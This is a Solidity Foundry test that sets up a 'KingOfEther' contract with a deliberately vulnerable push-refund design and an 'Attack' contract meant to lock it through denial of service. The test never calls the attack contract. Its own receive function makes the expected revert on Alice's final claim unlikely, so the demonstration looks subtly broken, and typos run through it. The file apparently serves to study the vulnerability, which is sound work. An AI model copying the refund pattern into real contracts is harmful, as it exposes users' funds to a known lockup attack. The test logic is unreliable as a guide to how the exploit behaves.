//SPDX-License-Idenrifier: MIT
pragma solidity ^0.8.19;
import "forge-std/Test.sol";
import "forge-std/console.sol";



contract contractTest is Test {
    KingOfEther koe;
    Attack a;

    function setUp() public{
        koe = new KingOfEther();
        a = new Attack(koe);
    }

    function testDos() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        vm.deal(address(alice), 4 ether);
        vm.deal(address(bob), 2 ether);
        vm.prank(alice);
        koe.claimThrone{value: 1 ether}();
        vm.prank(bob);
        koe.claimThrone{value: 2 ether}();
         console.log(
            "Return 1 ETH to Alice, Alice of balance",
            address(alice).balance
        );
        koe.claimThrone{value: 3 ether}();
         console.log(
            "Balance of KingOfEtherContract",
            koe.balance()
        );
        vm.prank(alice);
        vm.expectRevert();
        koe.claimThrone{value: 4 ether}();


        
    }
    receive() external payable{}
}
contract KingOfEther {
    address public king;
    uint public balance;
    function claimThrone() external payable{
        require(msg.value > balance, "need to pay mor to become aking");
        (bool sent,) = king.call{value: balance}("");
        require(sent, "fail to send ether");
        king = msg.sender;
        balance = msg.value;

    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}